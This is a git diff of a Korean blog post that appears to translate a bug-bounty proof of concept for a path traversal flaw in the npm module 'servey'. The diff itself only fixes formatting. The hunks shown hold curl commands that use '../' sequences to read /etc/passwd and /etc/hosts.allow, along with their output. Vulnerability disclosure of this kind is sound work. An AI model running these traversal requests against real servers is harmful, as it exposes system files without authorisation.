@@ -1,6 +1,6 @@
 ---
 layout: post
-title: [servey] 경로 이동 취약점은 확장 기능을 포함한 원격 서버의 어떠한 파일이라도 가져올 수 있게함
+title: \[servey\] 경로 이동 취약점은 확장 기능을 포함한 원격 서버의 어떠한 파일이라도 가져올 수 있게함
 categories: PoC
 tags: [Bugbounty, PathTraversal, Translation, Hackerone]
 ---
@@ -34,7 +34,7 @@ $ npm install servey
 {% endhighlight %}
 
 * 모듈의 npm 문서에서 가져온 다음의 예제 코드를 이용해 샘플 애플리케이션을 생성합니다:
-{% highlight html %}
+{% highlight javascript %}
 // app.js
 const Servey = require('servey');
 const Path = require('path') 
@@ -60,13 +60,13 @@ server.open();
 {% endhighlight %}
 
 * 앱을 실행합니다:
-{% highlight html %}
+{% highlight text %}
 $ node app.js 
 open
 {% endhighlight %}
 
 * /etc/passwd (어떠한 확장 기능도 없는 예시 파일)의 내용을 가져오길 시도합니다. servey는 이러한 파일의 접근을 허용하지 않고 HTTP 500 인터널 서버 에러를 띄웁니다:
-{% highlight html %}
+{% highlight text %}
 $ curl -v --path-as-is localhost:8080/../../../../../../etc/passwd
 *   Trying ::1...
 * connect to ::1 port 8080 failed: Connection refused
@@ -88,7 +88,7 @@ $ curl -v --path-as-is localhost:8080/../../../../../../etc/passwd
 {% endhighlight %}
 
 * 요청이 실패했다는 것을 로그를 통해 보여줍니다:
-{% highlight html %}
+{% highlight text %}
 $ node app.js 
 open
 /../../../../../../etc/passwd
@@ -100,7 +100,7 @@ open
 {% endhighlight %}
 
 * 이제, 다음의 curl 명령의 실행을 통해 /etc/hosts.allow (당신의 시스템 환경에 따라 ../ 경로를 추가해 주세요)의 내용을 가져오길 시도합니다:
-{% highlight html %}
+{% highlight text %}
 $ curl -v --path-as-is localhost:8080/../../../../../../etc/hosts.allow
 *   Trying ::1...
 * connect to ::1 port 8080 failed: Connection refused
@@ -131,7 +131,7 @@ $ curl -v --path-as-is localhost:8080/../../../../../../etc/hosts.allow
 {% endhighlight %}
 
 * servey앱의 로그를 다시한번 더 체크해봅니다:
-{% highlight html %}
+{% highlight text %}
 $ node app.js 
 open
 /../../../../../../etc/passwd
